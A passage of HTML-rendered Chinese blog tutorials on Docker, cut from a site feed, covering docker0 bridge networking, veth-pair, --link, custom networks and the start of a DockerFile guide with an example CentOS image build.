prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">思考？ linux与容器内部能不能互相ping通？ 可以</span></span><br><span class="line">[root@nanzx ~]# ping 172.17.0.3</span><br><span class="line">PING 172.17.0.3 (172.17.0.3) 56(84) bytes of data.</span><br><span class="line">64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.323 ms</span><br><span class="line">64 bytes from 172.17.0.3: icmp_seq=2 ttl=64 time=0.040 ms</span><br><span class="line">64 bytes from 172.17.0.3: icmp_seq=3 ttl=64 time=0.075 ms</span><br></pre></td></tr></table></figure><hr><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ol><li>我们每启动一个docker容器，docker就会给该容器分配一个IP地址；我们只要安装了docker， 就会有一个docker0的桥接模式，使用的技术是veth-pair技术！ </li><li>再启动一个容器测试，发现又多了一对网络 ：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx ~]# docker run -it -d -p 8081:8081 --name centos02 centos</span><br><span class="line"></span><br><span class="line">[root@nanzx ~]# ip addr</span><br><span class="line">17: veth701cf7e@if16: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP group default </span><br><span class="line">    link/ether a6:b5:be:2d:19:f9 brd ff:ff:ff:ff:ff:ff link-netnsid 2</span><br><span class="line">    inet6 fe80::a4b5:beff:fe2d:19f9/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"></span><br><span class="line">[root@nanzx ~]# docker exec -it centos02 ip addr</span><br><span class="line">16: eth0@if17: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:ac:11:00:04 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 172.17.0.4/16 brd 172.17.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">       </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试centos01和centos02能否相互ping通：</span></span><br><span class="line">[root@nanzx ~]# docker exec -it centos01 ping 172.17.0.4</span><br><span class="line">PING 172.17.0.4 (172.17.0.4) 56(84) bytes of data.</span><br><span class="line">64 bytes from 172.17.0.4: icmp_seq=1 ttl=64 time=0.210 ms</span><br><span class="line">64 bytes from 172.17.0.4: icmp_seq=2 ttl=64 time=0.062 ms</span><br><span class="line">64 bytes from 172.17.0.4: icmp_seq=3 ttl=64 time=0.062 ms</span><br></pre></td></tr></table></figure><blockquote><p>我们发现每启动一个容器，docker就会创建对应的网卡接口：veth701cf7e@if16和eth0@if17</p><p>这一对的虚拟设备接口就是veth-pair ，它们都是成对出现的，一端连着协议，一端彼此相连 </p><p>正因为有这个特性 veth-pair，docker0 充当一个桥梁来连接各种虚拟网络设备</p></blockquote><p>更详细可查看：<a href="https://blog.csdn.net/sld880311/article/details/77650937?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163129071916780366583346%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163129071916780366583346&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-77650937.first_rank_v2_pc_rank_v29&utm_term=veth-pair&spm=1018.2226.3001.4187">Linux-虚拟网络设备-veth pair</a></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20210911002732.png"></p><p><strong>结论</strong>：</p><ul><li>所有的容器不指定网络的情况下，都是docker0路由的，docker会给我们的容器分配一个默认的可用 IP</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20210911003146.png"></p><p><strong>结论</strong>：</p><ul><li>Docker使用的是Linux的桥接，宿主机是一个Docker容器的网桥</li><li>Docker中所有网络接口都是虚拟的，虚拟的转发效率高（内网传递文件）</li><li>只要容器删除，对应的网桥一对就没了</li></ul><h1 id="–link"><a href="#–link" class="headerlink" title="–link"></a>–link</h1><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>思考一个场景：我们编写了一个微服务，数据库url的IP地址变了，但项目不重启，我们希望可以处理这个问题，可以通过名字来进行访问容器？</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx ~]# docker exec -it centos01 ping centos02</span><br><span class="line">PING centos02 (120.240.95.35) 56(84) bytes of data.</span><br><span class="line">^C</span><br><span class="line">--- centos02 ping statistics ---</span><br><span class="line">6 packets transmitted, 0 received, 100% packet loss, time 8ms</span><br></pre></td></tr></table></figure><p>发现ping不通，我们再运行一个centos03，加上 –link参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx ~]# docker run -it -d -p 8082:8082 --name centos03 --link centos02 centos</span><br></pre></td></tr></table></figure><p>这时centos03就可以ping通centos02了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx ~]# docker exec -it centos03 ping centos02</span><br><span class="line">PING centos02 (172.17.0.4) 56(84) bytes of data.</span><br><span class="line">64 bytes from centos02 (172.17.0.4): icmp_seq=1 ttl=64 time=0.944 ms</span><br><span class="line">64 bytes from centos02 (172.17.0.4): icmp_seq=2 ttl=64 time=0.067 ms</span><br><span class="line">^C</span><br><span class="line">--- centos02 ping statistics ---</span><br><span class="line">2 packets transmitted, 2 received, 0% packet loss, time 3ms</span><br><span class="line">rtt min/avg/max/mdev = 0.067/0.505/0.944/0.439 ms</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>centos02 ping不通 centos03，所以–link是单向的。</p><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>通过<code>docker inspcet centos03</code>可看到 Links 增加了映射:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;Links&quot;: [</span><br><span class="line">    &quot;/centos02:/centos03/centos02&quot;</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>进入centos03容器，通过<code>cat /etc/hosts</code>可看到hosts域名解析的文件里增加了centos02的映射：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1localhost</span><br><span class="line">::1localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0ip6-localnet</span><br><span class="line">ff00::0ip6-mcastprefix</span><br><span class="line">ff02::1ip6-allnodes</span><br><span class="line">ff02::2ip6-allrouters</span><br><span class="line">172.17.0.4centos02 1ba08f27a55c #centos02</span><br><span class="line">172.17.0.5b7ff4f0af138</span><br></pre></td></tr></table></figure><p>所以，–link 本质就是在hosts配置中添加映射。</p><blockquote><p>现在使用Docker已经不建议使用–link了，推荐使用自定义网络（不适用docker0）。</p><p>docker0问题：不支持容器名连接访问， 只能通过加 –link参数。</p></blockquote><h1 id="自定义网络"><a href="#自定义网络" class="headerlink" title="自定义网络"></a>自定义网络</h1><h2 id="网络相关命令"><a href="#网络相关命令" class="headerlink" title="网络相关命令"></a>网络相关命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx ~]# docker network --help</span><br><span class="line"></span><br><span class="line">Usage:  docker network COMMAND</span><br><span class="line"></span><br><span class="line">Manage networks</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  connect     Connect a container to a network</span><br><span class="line">  create      Create a network</span><br><span class="line">  disconnect  Disconnect a container from a network</span><br><span class="line">  inspect     Display detailed information on one or more networks</span><br><span class="line">  ls          List networks</span><br><span class="line">  prune       Remove all unused networks</span><br><span class="line">  rm          Remove one or more networks</span><br><span class="line"></span><br><span class="line">Run &#x27;docker network COMMAND --help&#x27; for more information on a command.</span><br></pre></td></tr></table></figure><p>查看所有的docker网络：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx ~]# docker network ls</span><br><span class="line">NETWORK ID     NAME      DRIVER    SCOPE</span><br><span class="line">cb43c4e5baa2   bridge    bridge    local</span><br><span class="line">c5f5efea2089   host      host      local</span><br><span class="line">b9e8be9bb948   none      null      local</span><br></pre></td></tr></table></figure><p><strong>网络模式：</strong></p><p>bridge ：桥接 docker（默认，自己创建也是用bridge模式）</p><p>none ：不配置网络，一般不用</p><p>host ：和所主机共享网络</p><p>container ：容器网络连通（用得少！局限很大）</p><h2 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h2><p>我们直接启动的命令默认会加–net bridge，而这个就是我们得docker0，bridge就是docker0 :</p><p><code>docker run -d -P --name tomcat01 tomcat</code> 等价于 <code>docker run -d -P --name tomcat01 --net bridge tomcat</code></p><hr><p>docker0特点：默认，域名不能访问。( –link可以打通连接，但是很麻烦)，我们可以 自定义一个网络 ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx ~]# docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mynet</span><br><span class="line">88045facbfb2f67ac907189c4aee47af8861f17a66ea621b12083023d9f558cf</span><br><span class="line">[root@nanzx ~]# docker network ls</span><br><span class="line">NETWORK ID     NAME      DRIVER    SCOPE</span><br><span class="line">cb43c4e5baa2   bridge    bridge    local</span><br><span class="line">c5f5efea2089   host      host      local</span><br><span class="line">88045facbfb2   mynet     bridge    local</span><br><span class="line">b9e8be9bb948   none      null      local</span><br><span class="line"></span><br><span class="line">[root@nanzx ~]# docker inspect mynet</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;Name&quot;: &quot;mynet&quot;,</span><br><span class="line">        &quot;Id&quot;: &quot;88045facbfb2f67ac907189c4aee47af8861f17a66ea621b12083023d9f558cf&quot;,</span><br><span class="line">        &quot;Created&quot;: &quot;2021-09-11T12:02:55.134949838+08:00&quot;,</span><br><span class="line">        &quot;Scope&quot;: &quot;local&quot;,</span><br><span class="line">        &quot;Driver&quot;: &quot;bridge&quot;,</span><br><span class="line">        &quot;EnableIPv6&quot;: false,</span><br><span class="line">        &quot;IPAM&quot;: &#123;</span><br><span class="line">            &quot;Driver&quot;: &quot;default&quot;,</span><br><span class="line">            &quot;Options&quot;: &#123;&#125;,</span><br><span class="line">            &quot;Config&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;Subnet&quot;: &quot;192.168.0.0/16&quot;,</span><br><span class="line">                    &quot;Gateway&quot;: &quot;192.168.0.1&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Internal&quot;: false,</span><br><span class="line">        &quot;Attachable&quot;: false,</span><br><span class="line">        &quot;Ingress&quot;: false,</span><br><span class="line">        &quot;ConfigFrom&quot;: &#123;</span><br><span class="line">            &quot;Network&quot;: &quot;&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;ConfigOnly&quot;: false,</span><br><span class="line">        &quot;Containers&quot;: &#123;&#125;,</span><br><span class="line">        &quot;Options&quot;: &#123;&#125;,</span><br><span class="line">        &quot;Labels&quot;: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>启动两个centos，再次查看网络情况：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx ~]# docker run -it -d -p 8083:8083 --name centos_net_01  --net mynet centos</span><br><span class="line">[root@nanzx ~]# docker run -it -d -p 8084:8084 --name centos_net_02  --net mynet centos</span><br><span class="line"></span><br><span class="line">[root@nanzx ~]# docker inspect mynet</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;Name&quot;: &quot;mynet&quot;,</span><br><span class="line">        &quot;Id&quot;: &quot;88045facbfb2f67ac907189c4aee47af8861f17a66ea621b12083023d9f558cf&quot;,</span><br><span class="line">        &quot;Created&quot;: &quot;2021-09-11T12:02:55.134949838+08:00&quot;,</span><br><span class="line">        &quot;Scope&quot;: &quot;local&quot;,</span><br><span class="line">        &quot;Driver&quot;: &quot;bridge&quot;,</span><br><span class="line">        &quot;EnableIPv6&quot;: false,</span><br><span class="line">        &quot;IPAM&quot;: &#123;</span><br><span class="line">            &quot;Driver&quot;: &quot;default&quot;,</span><br><span class="line">            &quot;Options&quot;: &#123;&#125;,</span><br><span class="line">            &quot;Config&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;Subnet&quot;: &quot;192.168.0.0/16&quot;,</span><br><span class="line">                    &quot;Gateway&quot;: &quot;192.168.0.1&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Internal&quot;: false,</span><br><span class="line">        &quot;Attachable&quot;: false,</span><br><span class="line">        &quot;Ingress&quot;: false,</span><br><span class="line">        &quot;ConfigFrom&quot;: &#123;</span><br><span class="line">            &quot;Network&quot;: &quot;&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;ConfigOnly&quot;: false,</span><br><span class="line">        &quot;Containers&quot;: &#123;</span><br><span class="line">            &quot;2cf1861af8ac4359aab51a5196c1c1424b0cca9ee2f1f51ed69e645f446c9e36&quot;: &#123;</span><br><span class="line">                &quot;Name&quot;: &quot;centos_net_02&quot;,</span><br><span class="line">                &quot;EndpointID&quot;: &quot;90f01a29816f3b961d8642c85011774bd612f43ace83d7a340d8a002449c0ab1&quot;,</span><br><span class="line">                &quot;MacAddress&quot;: &quot;02:42:c0:a8:00:03&quot;,</span><br><span class="line">                &quot;IPv4Address&quot;: &quot;192.168.0.3/16&quot;,</span><br><span class="line">                &quot;IPv6Address&quot;: &quot;&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;45628390452a41c10987df06f1a6e3df99182af15fcfc282daf49d7306acfbea&quot;: &#123;</span><br><span class="line">                &quot;Name&quot;: &quot;centos_net_01&quot;,</span><br><span class="line">                &quot;EndpointID&quot;: &quot;37941c2600d49422c13ccfb2fe01f13268b7a9b2a236e7c356118b78024049a2&quot;,</span><br><span class="line">                &quot;MacAddress&quot;: &quot;02:42:c0:a8:00:02&quot;,</span><br><span class="line">                &quot;IPv4Address&quot;: &quot;192.168.0.2/16&quot;,</span><br><span class="line">                &quot;IPv6Address&quot;: &quot;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Options&quot;: &#123;&#125;,</span><br><span class="line">        &quot;Labels&quot;: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在自定义的网络下，服务可以互相ping通，不用使用–link：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx ~]# docker exec -it centos_net_01 ping centos_net_02</span><br><span class="line">PING centos_net_02 (192.168.0.3) 56(84) bytes of data.</span><br><span class="line">64 bytes from centos_net_02.mynet (192.168.0.3): icmp_seq=1 ttl=64 time=0.082 ms</span><br><span class="line">^C</span><br><span class="line">--- centos_net_02 ping statistics ---</span><br><span class="line">1 packets transmitted, 1 received, 0% packet loss, time 0ms</span><br><span class="line">rtt min/avg/max/mdev = 0.082/0.082/0.082/0.000 ms</span><br><span class="line"></span><br><span class="line">[root@nanzx ~]# docker exec -it centos_net_01 ping 192.168.0.3</span><br><span class="line">PING 192.168.0.3 (192.168.0.3) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.0.3: icmp_seq=1 ttl=64 time=0.251 ms</span><br><span class="line">64 bytes from 192.168.0.3: icmp_seq=2 ttl=64 time=0.065 ms</span><br><span class="line">^C</span><br><span class="line">--- 192.168.0.3 ping statistics ---</span><br><span class="line">2 packets transmitted, 2 received, 0% packet loss, time 2ms</span><br><span class="line">rtt min/avg/max/mdev = 0.065/0.158/0.251/0.093 ms</span><br></pre></td></tr></table></figure><p>好处：不同的集群使用不同的网络，保证集群是安全和健康的，推荐我们平时这样使用网络！</p><h1 id="网络连通"><a href="#网络连通" class="headerlink" title="网络连通"></a>网络连通</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx ~]# docker network --help</span><br><span class="line">Usage:  docker network COMMAND</span><br><span class="line">Manage networks</span><br><span class="line">Commands:</span><br><span class="line">  connect     Connect a container to a network</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">[root@nanzx ~]# docker network connect --help</span><br><span class="line">Usage:  docker network connect [OPTIONS] NETWORK CONTAINER</span><br><span class="line">Connect a container to a network</span><br><span class="line">Options:</span><br><span class="line">      --alias strings           Add network-scoped alias for the container</span><br><span class="line">      --driver-opt strings      driver options for the network</span><br><span class="line">      --ip string               IPv4 address (e.g., 172.30.100.104)</span><br><span class="line">      --ip6 string              IPv6 address (e.g., 2001:db8::33)</span><br><span class="line">      --link list               Add link to another container</span><br><span class="line">      --link-local-ip strings   Add a link-local address for the container</span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20210911142856.png"></p><p>正常情况如图所示，tomcat-01是不能直接访问tomcat-net-01的，需通过<code>docker network connect mynet tomcat-01 </code>将 tomcat01加到 mynet网络，这时tomcat01会有两个IP地址。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DockerFile解析</title>
      <link href="/posts/e53/"/>
      <url>/posts/e53/</url>
      
        <content type="html"><![CDATA[<h1 id="初识DockerFile"><a href="#初识DockerFile" class="headerlink" title="初识DockerFile"></a>初识DockerFile</h1><p>Dockerfile是用来<strong>构建Docker镜像</strong>的构建文件，是由一系列命令和参数构成的脚本。</p><p>构建发布的四个步骤：</p><ol><li>编写DockerFile文件</li><li>docker build</li><li>docker run</li><li>docker push发布镜像（DockerHub 、阿里云仓库)</li></ol><p>以熟悉的CentOS7为例：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> scratch</span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> centos-7-docker.tar.xz /</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> org.label-schema.schema-version=<span class="string">&quot;1.0&quot;</span> \</span></span><br><span class="line"><span class="language-bash">    org.label-schema.name=<span class="string">&quot;CentOS Base Image&quot;</span> \</span></span><br><span class="line"><span class="language-bash">    org.label-schema.vendor=<span class="string">&quot;CentOS&quot;</span> \</span></span><br><span class="line"><span class="language-bash">    org.label-schema.license=<span class="string">&quot;GPLv2&quot;</span> \</span></span><br><span class="line"><span class="language-bash">    org.label-schema.build-date=<span class="string">&quot;20181204&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/bin/bash&quot;</span>]</span></span><br></pre></td></tr></table></figure><h1 id="DockerFile构建过程"><a href="#DockerFile构建过程" class="headerlink" title="DockerFile构建过程"></a>DockerFile构建过程</h1><p><strong>基础知识：</strong></p><ol><li><p>每个保留关键字（指令）都是必须是大写字母，并且后面要跟随至少一个参数</p></li><li><p>执行从上到下顺序</p></li><li><p>#表示注释</p></li><li><p>每一个指令都会创建一个新的镜像层并提交</p></li></ol><hr><p><strong>Docker执行DockerFile的大致流程：</strong></p><ol><li>docker从基础镜像运行一个容器</li><li>执行一条指令并对容器作出修改</li><li>执行类似docker commit的操作提交一个新的镜像层</li><li>docker再基于刚提交的镜像运行一个新容器</li><li>执行dockerfile中的下一条指令直到所有指令都执行完成</li></ol><hr><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20210626120726.png"></p><p>从应用软件的角度来看，Dockerfile、Docker镜像与Docker容器分别代表软件的三个不同阶段：</p><ul><li>Dockerfile是软件的原材料</li></ul><ul><li>Docker镜像是软件的交付品</li></ul><ul><li>Docker容器则可以认为是软件的运行态</li></ul><p>Dockerfile面向开发，Docker镜像成为交付标准，Docker容器则涉及部署与运维，三者缺一不可，合力充当Docker体系的基石。</p><blockquote><ol><li><p>Dockerfile，需要定义一个Dockerfile，Dockerfile定义了进程需要的一切东西。Dockerfile涉及的内容包括执行代码或者是文件、环境变量、依赖包、运行时环境、动态链接库、操作系统的发行版、服务进程和内核进程(当应用进程需要和系统服务和内核进程打交道，这时需要考虑如何设计namespace的权限控制)等等;</p></li><li><p>Docker镜像，在用Dockerfile定义一个文件之后，docker build时会产生一个Docker镜像，当运行 Docker镜像时，会真正开始提供服务;</p></li><li><p>Docker容器，容器是直接提供服务的</p></li></ol></blockquote><h1 id="DockerFile保留字指令"><a href="#DockerFile保留字指令" class="headerlink" title="DockerFile保留字指令"></a>DockerFile保留字指令</h1><table><thead><tr><th>保留字指令</th><th>说明</th></tr></thead><tbody><tr><td>FROM</td><td>基础镜像，当前镜像是基于哪个镜像的</td></tr><tr><td>MAINTAINER</td><td>镜像维护者的姓名和邮箱地址</td></tr><tr><td>RUN</td><td>镜像构建时需要运行的命令</td></tr><tr><td>EXPOSE</td><td>镜像对外暴露的端口</td></tr><tr><td>WORKDIR</td><td>指定在创建容器后，终端默认登陆的进来工作目录</td></tr><tr><td>ENV</td><td>用来镜像构建过程中设置环境变量</td></tr><tr><td>ADD</td><td>将宿主机目录下的文件拷贝进镜像且ADD命令会自动<strong>处理URL和解压tar压缩包</strong></td></tr><tr><td>COPY</td><td>类似ADD，拷贝文件和目录到镜像中。<br>将从构建上下文目录中&lt;源路径&gt;的文件&#x2F;目录复制到新的一层的镜像内的&lt;目标路径&gt;位置<br>COPY src dest或<strong>COPY [“src”,”dest”]</strong></td></tr><tr><td>VOLUME</td><td>容器数据卷，用于数据保存和持久化工作</td></tr><tr><td>CMD</td><td>指定这个容器启动的时候要运行的命令<br>Dockerfile中可以有多个CMD指令，但<strong>只有最后一个生效</strong>，CMD会被 docker run之后的参数替换</td></tr><tr><td>ENTRYPOINT</td><td>指定这个容器启动的时候要运行的命令，可以追加命令 。ENTRYPOINT的目的和CMD一样，都是在指定容器启动程序及参数</td></tr><tr><td>ONBUILD</td><td>当构建一个被继承的Dockerfile时运行命令，父镜像在被子继承后父镜像的onbuild被触发</td></tr></tbody></table><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20210905171117.png"></p><hr><h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><p><strong>Base镜像：</strong></p><p>Docker Hub 中99%的镜像都是通过在base镜像中安装和配置需要的软件构建出来的。</p><p>例如，CentOS7的DockerFile中，首行的<code>FROM scratch</code></p><hr><h2 id="自定义镜像myCentOs"><a href="#自定义镜像myCentOs" class="headerlink" title="自定义镜像myCentOs"></a>自定义镜像myCentOs</h2><p>1.编写DockerFile</p><ul><li><p>准备好CentOS镜像作为Base镜像: <code>docker pull centos</code></p></li><li><p>Hub默认的CentOS镜像：</p><ul><li>初始centos运行该镜像时，登录后的默认路径是 &#x2F;</li><li>默认不支持vim</li><li>默认不支持ifconfig</li></ul></li><li><p>自定义mycentos目的使我们自己的镜像具备如下：</p><ul><li>登陆后的默认路径</li><li>vim编辑器</li><li>查看网络配置ifconfig支持</li></ul></li><li><p>在路径下新建一个以Dockerfile命名的文件，<code>vi Dockerfile</code>，也可以通过构建时 -f 参数指定文件</p></li></ul><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">MAINTAINER</span> nan&lt;<span class="number">839777408</span>@qq.com&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> MYPATH /usr/local</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> <span class="variable">$MYPATH</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum -y install vim</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum -y install net-tools</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> <span class="built_in">echo</span> <span class="variable">$MYPATH</span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;success--------------ok&quot;</span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> /bin/bash</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>2.在DockerFile所在路径下构建：<code>docker build -t 新镜像名字:TAG .</code></p><p><strong>注意：</strong>新镜像名字必须全小写，TAG 后面有个小点表示当前路径</p><p>构建结果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 